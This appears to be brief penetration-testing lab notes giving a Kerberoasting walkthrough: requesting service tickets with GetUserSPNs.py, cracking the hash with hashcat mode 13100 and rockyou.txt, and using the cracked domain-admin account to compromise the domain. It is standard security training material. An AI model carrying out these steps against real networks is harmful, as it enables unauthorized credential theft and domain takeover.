## Kerberoasting Walkthrough 
- Get user SPNs: `sudo GetUserSPNs.py <doamin>/<username>:<password> -dc-ip <DC IP> -request

  ![image](https://github.com/user-attachments/assets/2ec6d710-cc19-4e33-99b7-eea8929409ae)

- Be careful with a last logon of never as it could be a honeypot
- Copy hash and paste into text file using `mousepad`
-  Crack it: `hashcat -m 13100 <hash> /usr/share/wordlists/rockyou.txt`

    ![image](https://github.com/user-attachments/assets/cfeeb420-6bcf-45ed-be2f-ccee6dfc5f6d)

- Since this is a domain admin, we could use this to compromise the domain
